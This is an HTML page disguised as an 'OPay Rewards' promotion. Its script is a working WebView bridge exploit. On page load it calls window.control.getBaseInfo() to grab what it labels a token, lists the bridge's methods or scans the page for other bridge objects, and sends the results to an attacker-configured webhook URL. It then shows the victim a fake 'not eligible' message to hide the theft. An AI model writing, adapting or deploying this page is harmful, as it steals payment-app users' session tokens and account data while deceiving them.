<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Rewards</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #1a5c3a 0%, #0d2b1a 100%);
            color: white;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #4caf50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        h2 {
            color: #4caf50;
            margin-bottom: 10px;
        }

        p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
        }
    </style>
</head>

<body>
    <div class="card">
        <h2>🎁 OPay Rewards</h2>
        <p>Verifying your account eligibility...</p>
        <div class="spinner"></div>
        <p id="status" style="font-size: 12px; color: rgba(255,255,255,0.5);">Loading...</p>
    </div>

    <script>
        // ═══════════════════════════════════════════════════
        // CHANGE THIS to your webhook.site URL
        var EXFIL_URL = "PASTE_YOUR_WEBHOOK_URL_HERE";
        // ═══════════════════════════════════════════════════

        function send(data) {
            var img = new Image();
            img.src = EXFIL_URL + "?" + data;
            // Backup: fetch
            fetch(EXFIL_URL + "?" + data, { mode: 'no-cors' }).catch(function () { });
        }

        window.onload = function () {
            var s = document.getElementById('status');

            // Try the known bridge
            if (window.control && window.control.getBaseInfo) {
                s.textContent = "Verifying...";
                try {
                    var info = window.control.getBaseInfo();
                    send("type=token&data=" + encodeURIComponent(info));

                    // Enumerate all methods on the bridge
                    var methods = [];
                    for (var prop in window.control) {
                        methods.push(prop);
                    }
                    send("type=methods&data=" + encodeURIComponent(methods.join(",")));

                    s.textContent = "Almost done...";
                } catch (e) {
                    send("type=error&data=" + encodeURIComponent(e.message));
                }
            } else {
                // Scan for any bridge objects
                var found = [];
                var props = Object.getOwnPropertyNames(window);
                for (var i = 0; i < props.length; i++) {
                    var p = props[i];
                    try {
                        if (typeof window[p] === 'object' && window[p] !== null &&
                            !['window', 'document', 'location', 'navigator', 'screen', 'history', 'chrome', 'performance', 'caches', 'indexedDB', 'localStorage', 'sessionStorage'].includes(p)) {
                            found.push(p);
                        }
                    } catch (e) { }
                }
                send("type=scan&bridges=" + encodeURIComponent(found.join(",")));
                s.textContent = "Processing...";
            }

            // Show fake success after delay
            setTimeout(function () {
                s.textContent = "You're not eligible for this promotion.";
                document.querySelector('.spinner').style.display = 'none';
            }, 3000);
        };
    </script>
</body>

</html>
